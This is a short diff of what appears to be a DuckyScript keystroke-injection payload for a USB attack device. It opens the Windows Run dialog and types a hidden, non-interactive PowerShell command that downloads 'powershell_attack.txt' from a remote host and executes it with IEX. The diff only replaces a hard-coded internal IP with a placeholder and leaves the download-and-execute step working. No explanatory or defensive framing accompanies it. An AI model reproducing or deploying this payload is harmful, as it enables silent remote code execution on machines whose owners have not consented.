@@ -20,5 +20,5 @@ ALT y
 DELAY 500
 GUI r
 DELAY 500
-STRING powershell -W Hidden -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('http://10.10.3.129/powershell_attack.txt')"
+STRING powershell -W Hidden -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('http://X.X.X.X/powershell_attack.txt')"
 ENTER
